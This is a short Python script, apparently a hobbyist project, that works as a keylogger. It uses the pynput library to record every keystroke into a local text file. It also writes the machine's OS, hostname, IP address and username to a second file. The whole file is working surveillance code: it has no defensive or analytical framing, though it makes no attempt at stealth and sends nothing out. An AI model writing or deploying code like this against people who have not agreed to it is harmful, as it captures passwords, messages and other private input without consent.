#Main keylogger

#Import Modules
import pynput
from pynput import keyboard
import platform # Get system info (for sys_info)
import socket # Get network info (for sys_info)
import getpass # Get username (for sys_info)


key_info = "key_log.txt" # text file for key presses
sys_info = "sys_info.txt" # text file for os info 


#Function to log key presses
def Keypress(key):
    print(str(key))
    with open(key_info, "a") as logKey:   #Open log file to append to
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            logKey.write(f"[{str(key).replace('Key.', '')}]") # This is for special keys like space, enter, etc. To make it look more neat, .replace will remove the Key. from the log file

#Function to log system information
def system_information():
    with open(sys_info, "w") as logSys: #recalling the file we made earlier so that it can start writing to it
        logSys.write(f"System: {platform.system()} {platform.release()}\n")
        logSys.write(f"Network Name: {platform.node()}\n")
        logSys.write(f"Machine: {platform.machine()}\n")
        logSys.write(f"Processor: {platform.processor()}\n")
        logSys.write(f"Hostname: {socket.gethostname()}\n")
        logSys.write(f"IP Address: {socket.gethostbyname(socket.gethostname())}\n")
        logSys.write(f"Username: {getpass.getuser()}\n") # everything from line 28 to 34 is for system information, look at the name to see what it will capture...


#Main function (Used to listen)        
if __name__ == "__main__":
    listner = keyboard.Listener(on_press=Keypress)
    listner.start()
    system_information()
    input()

